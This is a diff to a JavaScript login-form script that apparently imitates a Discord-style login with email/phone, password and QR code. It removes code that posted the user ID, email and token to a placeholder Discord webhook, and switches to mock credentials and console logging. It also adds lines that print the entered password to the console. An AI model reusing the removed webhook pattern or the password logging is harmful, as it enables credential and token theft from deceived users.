@@ -6,9 +6,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const qrCodeElement = document.querySelector(".qr-code");
   const qrCodeImg = document.createElement("img");
 
-  // Discord webhook URL (replace with your own)
-  const WEBHOOK_URL = "your_discord_webhook_url"; // Replace with your Discord webhook URL
-
   // Mock user credentials for testing
   const MOCK_CREDENTIALS = {
     email: "test@example.com",
@@ -53,11 +50,16 @@ document.addEventListener("DOMContentLoaded", () => {
   // Form submission with mock authentication
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
-    const email = emailInput.value.trim();
+    const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value.trim();
+
+    // Debug: Log inputs
+    console.log("Email entered:", email);
+    console.log("Password entered:", password);
 
     if (!email || !password) {
       alert("Please fill in both email/phone and password.");
+      console.log("Validation failed: Missing email or password");
       return;
     }
 
@@ -73,29 +75,21 @@ document.addEventListener("DOMContentLoaded", () => {
 
     try {
       // Simulate authentication
+      console.log("Checking credentials...");
       if (
-        email.toLowerCase() !== MOCK_CREDENTIALS.email ||
+        email !== MOCK_CREDENTIALS.email.toLowerCase() ||
         password !== MOCK_CREDENTIALS.password
       ) {
         throw new Error("Invalid email or password.");
       }
 
-      // Send mock user data to webhook
-      const response = await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          content: `**Login Info**\nUser ID: ${MOCK_USER_DATA.id}\nUsername: ${MOCK_USER_DATA.username}\nEmail: ${MOCK_USER_DATA.email}\nToken: ${MOCK_USER_DATA.token}`,
-        }),
-      });
+      // Log mock user data to console (instead of webhook)
+      const loginInfo = {
+        content: `**Login Info**\nUser ID: ${MOCK_USER_DATA.id}\nUsername: ${MOCK_USER_DATA.username}\nEmail: ${MOCK_USER_DATA.email}\nToken: ${MOCK_USER_DATA.token}`,
+      };
+      console.log("Login successful! Data:", loginInfo);
 
-      if (!response.ok) {
-        throw new Error("Failed to send data to webhook.");
-      }
-
-      alert("Login successful! Data sent to webhook.");
+      alert("Login successful! Check console for login info.");
       emailInput.value = "";
       passwordInput.value = "";
     } catch (error) {
